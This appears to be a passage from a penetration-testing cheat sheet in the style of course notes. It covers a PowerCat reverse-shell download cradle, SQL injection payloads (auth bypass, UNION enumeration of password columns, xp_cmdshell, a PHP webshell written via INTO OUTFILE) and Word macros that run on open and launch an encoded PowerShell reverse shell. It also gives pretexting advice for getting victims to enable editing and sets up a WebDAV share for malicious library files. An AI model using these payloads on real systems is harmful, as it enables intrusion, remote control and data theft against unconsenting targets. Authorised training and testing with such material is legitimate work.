</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="c">## Execute Powercat to get a Reverse Shell</span>
</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a><span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">Webclient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s2">&quot;http://&lt;IP&gt;/powercat.ps1&quot;</span><span class="p">);</span><span class="n">powercat</span> <span class="n">-c</span> <span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">-p</span> <span class="p">&lt;</span><span class="n">PORT</span><span class="p">&gt;</span> <span class="n">-e</span> <span class="n">powershell</span> 
</span></code></pre></div>
<hr />
<h2 id="sql-injection-attacks">SQL Injection Attacks</h2>
<h3 id="sql-theory-and-databases">SQL Theory and Databases</h3>
<h4 id="db-types-and-characteristics"><strong>DB Types and Characteristics</strong></h4>
<p><strong><em>MySQL</em></strong></p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="n">mysql</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="p">[</span><span class="k">user</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="p">[</span><span class="n">pass</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="n">h</span><span class="w"> </span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="p">[</span><span class="n">PORT</span><span class="p">]</span><span class="w"> </span><span class="c1">--skip-ssl</span>
</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>
</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="n">MySQL</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="k">version</span><span class="p">();</span>
</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="n">MySQL</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="k">system_user</span><span class="p">();</span>
</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a><span class="n">MySQL</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="k">show</span><span class="w"> </span><span class="n">databases</span><span class="p">;</span>
</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a><span class="n">MySQL</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">user</span><span class="p">,</span><span class="w"> </span><span class="n">authentication_string</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="k">user</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;offsec&#39;</span><span class="p">;</span>
</span></code></pre></div>
<aside>


The *root* user retrieved with *select system_user();* is the database-specific root
user, not the system-wide administrative root user.

</aside>

<p><strong><em>MSSQL</em></strong></p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="n">impacket</span><span class="o">-</span><span class="n">mssqlclient</span><span class="w"> </span><span class="p">[</span><span class="k">USER</span><span class="p">]:[</span><span class="n">PASS</span><span class="p">]</span><span class="o">@</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="n">windows</span><span class="o">-</span><span class="n">auth</span>
</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>
</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="k">SQL</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="o">@@</span><span class="k">version</span><span class="p">;</span>
</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="k">SQL</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sys</span><span class="p">.</span><span class="n">databases</span><span class="p">;</span>
</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="k">SQL</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">offsec</span><span class="p">.</span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="p">;</span>
</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a><span class="k">SQL</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">offsec</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">users</span><span class="p">;</span>
</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="k">SQL</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">master</span><span class="p">.</span><span class="n">sys</span><span class="p">.</span><span class="n">server_principals</span>
</span></code></pre></div>
<h3 id="manual-sql-exploitation"><strong>Manual SQL Exploitation</strong></h3>
<h4 id="error-based-payloads"><strong>Error-based Payloads</strong></h4>
<p><strong><em>SQL code vulnerable to Error-based SQL Injection</em></strong></p>
<div class="language-php highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="cp">&lt;?php</span>
</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="nv">$uname</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">];</span>
</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="nv">$passwd</span> <span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>
</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a><span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users WHERE user_name= &#39;</span><span class="si">$uname</span><span class="s2">&#39; AND password=&#39;</span><span class="si">$passwd</span><span class="s2">&#39;&quot;</span><span class="p">;</span>
</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a><span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con</span><span class="p">,</span> <span class="nv">$sql_query</span><span class="p">);</span>
</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a><span class="cp">?&gt;</span>
</span></code></pre></div>
<p><strong><em>Error-based payloads</em></strong></p>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="gu">## Auth Bypass.</span>
</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>offsec&#39; OR 1=1 -- // 
</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>
</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="gu">## Enumerating the database directly</span>
</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>offsec&#39; OR 1=1 in (SELECT @@version) -- //
</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>offsec&#39; OR 1=1 in (SELECT * FROM users) -- //
</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a>offsec&#39; or 1=1 in (SELECT password FROM users) -- //
</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a>offsec&#39; or 1=1 in (SELECT password FROM users WHERE username = &#39;admin&#39;) -- //
</span></code></pre></div>
<h4 id="union-based-payloads"><strong>UNION-based Payloads</strong></h4>
<p><strong><em>SQL code vulnerable to UNION-based SQL Injection</em></strong></p>
<div class="language-php highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="x">$query = &quot;SELECT * from customers WHERE name LIKE &#39;&quot;.$_POST[&quot;search_input&quot;].&quot;%&#39;&quot;;</span>
</span></code></pre></div>
<p>For <strong>UNION</strong> SQLi attacks to work, first need to satisfy two
conditions:</p>
<ol>
<li>The injected <strong>UNION</strong> query has to include the same number of columns as the original query.</li>
<li>The data types need to be compatible between each column.</li>
</ol>
<p><strong><em>UNION-based payloads</em></strong></p>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="gu">## Discover the correct number of columns</span>
</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>&#39; ORDER BY 1-- //   
</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>
</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a><span class="gu">## Determine which columns are displayed</span>
</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>%&#39; UNION SELECT &#39;a1&#39;, &#39;a2&#39;, &#39;a3&#39;, &#39;a4&#39;, &#39;a5&#39; -- //
</span><span id="__span-25-6"><a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a>
</span><span id="__span-25-7"><a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a><span class="gu">## Enumerate the database</span>
</span><span id="__span-25-8"><a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a>%&#39; UNION SELECT database(), user(), @@version, null, null -- //
</span><span id="__span-25-9"><a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a>%&#39; UNION SELECT null, null, database(), user(), @@version -- //
</span><span id="__span-25-10"><a id="__codelineno-25-10" name="__codelineno-25-10" href="#__codelineno-25-10"></a>
</span><span id="__span-25-11"><a id="__codelineno-25-11" name="__codelineno-25-11" href="#__codelineno-25-11"></a>&#39; UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database() -- //
</span><span id="__span-25-12"><a id="__codelineno-25-12" name="__codelineno-25-12" href="#__codelineno-25-12"></a>
</span><span id="__span-25-13"><a id="__codelineno-25-13" name="__codelineno-25-13" href="#__codelineno-25-13"></a>&#39; UNION SELECT null, username, password, description, null FROM users -- //
</span></code></pre></div>
<h4 id="blind-sql-injections"><strong>Blind SQL Injections</strong></h4>
<p><strong><em>BLIND SQLi payloads</em></strong></p>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="gu">## Test for boolean-based SQLi</span>
</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>offsec&#39; AND 1=1 -- //
</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>
</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="gu">## Test for time-based SQLi</span>
</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>offsec&#39; AND IF (1=1, sleep(3),&#39;false&#39;) -- //
</span></code></pre></div>
<h3 id="manual-and-automated-code-execution"><strong>Manual and Automated Code Execution</strong></h3>
<h4 id="manual-code-execution"><strong>Manual Code Execution</strong></h4>
<p><strong><em>MSSQL - xp_cmdshell</em></strong></p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="n">impacket</span><span class="o">-</span><span class="n">mssqlclient</span><span class="w"> </span><span class="p">[</span><span class="k">USER</span><span class="p">]:[</span><span class="n">PASS</span><span class="p">]</span><span class="o">@</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="n">windows</span><span class="o">-</span><span class="n">auth</span>
</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>
</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="k">EXECUTE</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;show advanced options&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="n">RECONFIGURE</span><span class="p">;</span>
</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a><span class="k">EXECUTE</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;xp_cmdshell&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
</span><span id="__span-27-6"><a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a><span class="n">RECONFIGURE</span><span class="p">;</span>
</span><span id="__span-27-7"><a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a><span class="k">EXECUTE</span><span class="w"> </span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">&#39;whoami&#39;</span><span class="p">;</span>
</span></code></pre></div>
<p><strong>MySQL - write files on the web server.</strong></p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="s1">&#39; UNION SELECT &quot;&lt;?php system($_GET[&#39;</span><span class="n">cmd</span><span class="err">&#39;</span><span class="p">]);</span><span class="o">?&gt;</span><span class="ss">&quot;, null, null, null, null INTO OUTFILE &quot;</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">webshell</span><span class="p">.</span><span class="n">php</span><span class="err">&quot;</span><span class="w"> </span><span class="c1">-- //</span>
</span></code></pre></div>
<h4 id="automating-the-attack"><strong>Automating the Attack</strong></h4>
<p><strong><em>SQLmap</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>sqlmap<span class="w"> </span>-r<span class="w"> </span><span class="o">[</span>request<span class="o">]</span><span class="w"> </span>-p<span class="w"> </span><span class="o">[</span>param<span class="o">]</span><span class="w">  </span>--os-shell<span class="w">  </span>--web-root<span class="w"> </span><span class="s2">&quot;/var/www/html/&quot;</span>
</span></code></pre></div>
<hr />
<h2 id="client-side-attacks"><strong>Client-side Attacks</strong></h2>
<h3 id="target-reconnaissance"><strong>Target Reconnaissance</strong></h3>
<h4 id="information-gathering_1"><strong>Information Gathering</strong></h4>
<p><strong><em>Browser through the target website and gather metadata of documents:</em></strong></p>
<p><code>exiftool -a -u document.pdf</code></p>
<h4 id="client-fingerprinting"><strong>Client Fingerprinting</strong></h4>
<p><strong><em>Device Fingerprinting via <a href="https://canarytokens.com/nest/">canavarytokens</a></em></strong></p>
<p><a href="https://canarytokens.com/nest/">Know.  Before it matters</a></p>
<p><strong><em>User-Agent header parser via <a href="https://explore.whatismybrowser.com/useragents/parse/">whatismybrowser.com</a></em></strong></p>
<p><a href="https://explore.whatismybrowser.com/useragents/parse/"></a></p>
<p><strong><em>Browser Fingerprint via <a href="https://github.com/fingerprintjs/fingerprintjs">fingerprintjs</a></em></strong></p>
<p><a href="https://github.com/fingerprintjs/fingerprintjs">https://github.com/fingerprintjs/fingerprintjs</a></p>
<h3 id="exploiting-microsoft-office"><strong>Exploiting Microsoft Office</strong></h3>
<h4 id="preparing-the-attack"><strong>Preparing the Attack</strong></h4>
<blockquote>
<p>To deliver our payload and increase the chances that the target opens the document, we could use a pretext and provide the document in another way, like a download link.
</p>
<p>Convince the target to click the <em>Enable Editing</em> button by, for
example, blurring the rest of the document and instructing them to
click the button to "unlock" it.
</p>
<p>We could also rely on other macro-enabled Microsoft Office programs that
lack Protected View, like <em>Microsoft Publisher</em>, but this is less frequently installed.
</p>
<p>Finally, we must consider <a href="https://techcommunity.microsoft.com/t5/microsoft-365-blog/helping-users-stay-safe-blocking-internet-macros-by-default-in/ba-p/3071805">Microsoft's announcement</a> that discusses blocking macros by default
</p>
</blockquote>
<h4 id="leveraging-microsoft-word-macros"><strong>Leveraging Microsoft Word Macros</strong></h4>
<blockquote>
<p><strong>.doc</strong> and <strong>.docm</strong> can save or embed macros, while <strong>.docx</strong> cant.
</p>
<p>Choose Document1 (document) from the drop-down menu in the Macros dialog window to select our unnamed document. If do not, our macro will not be saved to the document but rather to our global template.
</p>
</blockquote>
<p><strong><em>Example of macros</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>Sub<span class="w"> </span>MyMacro<span class="o">()</span>
</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>
</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a><span class="w">  </span>CreateObject<span class="o">(</span><span class="s2">&quot;Wscript.Shell&quot;</span><span class="o">)</span>.Run<span class="w"> </span><span class="s2">&quot;powershell&quot;</span>
</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>
</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>End<span class="w"> </span>Sub
</span></code></pre></div>
<p><strong><em>Auto execute Powershell when a Word document is opened</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>Sub<span class="w"> </span>AutoOpen<span class="o">()</span>
</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>
</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a><span class="w">  </span>MyMacro
</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a>
</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a>End<span class="w"> </span>Sub
</span><span id="__span-31-6"><a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a>
</span><span id="__span-31-7"><a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a>Sub<span class="w"> </span>Document_Open<span class="o">()</span>
</span><span id="__span-31-8"><a id="__codelineno-31-8" name="__codelineno-31-8" href="#__codelineno-31-8"></a>
</span><span id="__span-31-9"><a id="__codelineno-31-9" name="__codelineno-31-9" href="#__codelineno-31-9"></a><span class="w">  </span>MyMacro
</span><span id="__span-31-10"><a id="__codelineno-31-10" name="__codelineno-31-10" href="#__codelineno-31-10"></a>
</span><span id="__span-31-11"><a id="__codelineno-31-11" name="__codelineno-31-11" href="#__codelineno-31-11"></a>End<span class="w"> </span>Sub
</span><span id="__span-31-12"><a id="__codelineno-31-12" name="__codelineno-31-12" href="#__codelineno-31-12"></a>
</span><span id="__span-31-13"><a id="__codelineno-31-13" name="__codelineno-31-13" href="#__codelineno-31-13"></a>Sub<span class="w"> </span>MyMacro<span class="o">()</span>
</span><span id="__span-31-14"><a id="__codelineno-31-14" name="__codelineno-31-14" href="#__codelineno-31-14"></a>
</span><span id="__span-31-15"><a id="__codelineno-31-15" name="__codelineno-31-15" href="#__codelineno-31-15"></a>End<span class="w"> </span>Sub
</span></code></pre></div>
<p><strong><em>Reverse Shell macros via base64 encoded PowerCat</em></strong></p>
<blockquote>
<p>We should note that VBA has a 255-character limit for literal strings and therefore, we can't just embed the base64-encoded PowerShell commands as a single string. This restriction does not apply to strings stored in variables, so we can split the commands into multiple lines (stored in strings) and concatenate them.
</p>
</blockquote>
<aside>


UTF-16LE is the default character set for base64 encoding that PowerShell supports. If we choose any other character set, our payload wont work.

</aside>

<div class="language-markdown highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="gu">## PowrCat Reverse Shell Script</span>
</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>echo -n &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://&lt;IP&gt;/powercat.ps1&#39;);powercat -c &lt;IP&gt; -p &lt;PORT&gt; -e powershell&quot; | iconv -t UTF-16LE | base64 -w 0
</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>
</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a>python3 -m http.server 80
</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a>
</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a><span class="gu">## Python Script to split the commands into multiple lines</span>
</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a>str = &quot;powershell.exe -nop -w hidden -enc &lt;base64 encoded PowerCat script&gt;&quot;
</span><span id="__span-32-8"><a id="__codelineno-32-8" name="__codelineno-32-8" href="#__codelineno-32-8"></a>n = 50
</span><span id="__span-32-9"><a id="__codelineno-32-9" name="__codelineno-32-9" href="#__codelineno-32-9"></a>for i in range(0, len(str), n):
</span><span id="__span-32-10"><a id="__codelineno-32-10" name="__codelineno-32-10" href="#__codelineno-32-10"></a>    print(&quot;Str = Str + &quot; + &#39;&quot;&#39; + str[i:i+n] + &#39;&quot;&#39;)
</span><span id="__span-32-11"><a id="__codelineno-32-11" name="__codelineno-32-11" href="#__codelineno-32-11"></a>
</span><span id="__span-32-12"><a id="__codelineno-32-12" name="__codelineno-32-12" href="#__codelineno-32-12"></a>
</span><span id="__span-32-13"><a id="__codelineno-32-13" name="__codelineno-32-13" href="#__codelineno-32-13"></a><span class="gu">## Macro to get RCE</span>
</span><span id="__span-32-14"><a id="__codelineno-32-14" name="__codelineno-32-14" href="#__codelineno-32-14"></a>Sub AutoOpen()
</span><span id="__span-32-15"><a id="__codelineno-32-15" name="__codelineno-32-15" href="#__codelineno-32-15"></a>    MyMacro
</span><span id="__span-32-16"><a id="__codelineno-32-16" name="__codelineno-32-16" href="#__codelineno-32-16"></a>End Sub
</span><span id="__span-32-17"><a id="__codelineno-32-17" name="__codelineno-32-17" href="#__codelineno-32-17"></a>
</span><span id="__span-32-18"><a id="__codelineno-32-18" name="__codelineno-32-18" href="#__codelineno-32-18"></a>Sub Document_Open()
</span><span id="__span-32-19"><a id="__codelineno-32-19" name="__codelineno-32-19" href="#__codelineno-32-19"></a>    MyMacro
</span><span id="__span-32-20"><a id="__codelineno-32-20" name="__codelineno-32-20" href="#__codelineno-32-20"></a>End Sub
</span><span id="__span-32-21"><a id="__codelineno-32-21" name="__codelineno-32-21" href="#__codelineno-32-21"></a>
</span><span id="__span-32-22"><a id="__codelineno-32-22" name="__codelineno-32-22" href="#__codelineno-32-22"></a>Sub MyMacro()
</span><span id="__span-32-23"><a id="__codelineno-32-23" name="__codelineno-32-23" href="#__codelineno-32-23"></a>    Dim Str As String
</span><span id="__span-32-24"><a id="__codelineno-32-24" name="__codelineno-32-24" href="#__codelineno-32-24"></a>
</span><span id="__span-32-25"><a id="__codelineno-32-25" name="__codelineno-32-25" href="#__codelineno-32-25"></a>    Str = Str + &quot;powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU&quot;
</span><span id="__span-32-26"><a id="__codelineno-32-26" name="__codelineno-32-26" href="#__codelineno-32-26"></a>        Str = Str + &quot;AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd&quot;
</span><span id="__span-32-27"><a id="__codelineno-32-27" name="__codelineno-32-27" href="#__codelineno-32-27"></a>        Str = Str + &quot;AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB&quot;
</span><span id="__span-32-28"><a id="__codelineno-32-28" name="__codelineno-32-28" href="#__codelineno-32-28"></a>    ...
</span><span id="__span-32-29"><a id="__codelineno-32-29" name="__codelineno-32-29" href="#__codelineno-32-29"></a>        Str = Str + &quot;QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA&quot;
</span><span id="__span-32-30"><a id="__codelineno-32-30" name="__codelineno-32-30" href="#__codelineno-32-30"></a>        Str = Str + &quot;gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA&quot;
</span><span id="__span-32-31"><a id="__codelineno-32-31" name="__codelineno-32-31" href="#__codelineno-32-31"></a>        Str = Str + &quot;A== &quot;
</span><span id="__span-32-32"><a id="__codelineno-32-32" name="__codelineno-32-32" href="#__codelineno-32-32"></a>
</span><span id="__span-32-33"><a id="__codelineno-32-33" name="__codelineno-32-33" href="#__codelineno-32-33"></a>    CreateObject(&quot;Wscript.Shell&quot;).Run Str
</span><span id="__span-32-34"><a id="__codelineno-32-34" name="__codelineno-32-34" href="#__codelineno-32-34"></a>End Sub
</span></code></pre></div>
<h3 id="abusing-windows-library-files"><strong>Abusing Windows Library Files</strong></h3>
<h4 id="obtaining-code-execution-via-windows-library-files"><strong>Obtaining Code Execution via Windows Library Files</strong></h4>
<blockquote>
<p>Windows library files are virtual containers for user content. They
connect users with data stored in remote locations like web services
or shares. These files have a <strong>.Library-ms</strong> file extension and can
be executed by double-clicking them in Windows Explorer.
</p>
</blockquote>
<p><strong><em>set up a WebDAV / SMB share on our Kali system</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="c1">## https://wsgidav.readthedocs.io/en/latest/index.html</span>
</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>pip3<span class="w"> </span>install<span class="w"> </span>wsgidav
</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>apt<span class="w"> </span>install<span class="w"> </span>python3-wsgidav
</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a>
</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a>/home/kali/.local/bin/wsgidav<span class="w"> </span>--host<span class="o">=</span><span class="m">0</span>.0.0.0<span class="w"> </span>--port<span class="o">=</span><span class="m">80</span><span class="w"> </span>--auth<span class="o">=</span>anonymous<span class="w"> </span>--root<span class="w"> </span>/home/kali/webdav/
</span></code></pre></div>
<p><strong><em>Create a Windows library file connecting to a <a href="https://en.wikipedia.org/wiki/WebDAV">WebDAV</a> share</em></strong></p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/shell/library-schema-entry#namespace-versioning">***namespace</a> for the library file***</p>
<div class="language-xml highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="nt">&lt;libraryDescription</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://schemas.microsoft.com/windows/2009/library&quot;</span><span class="nt">&gt;</span>
</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>...
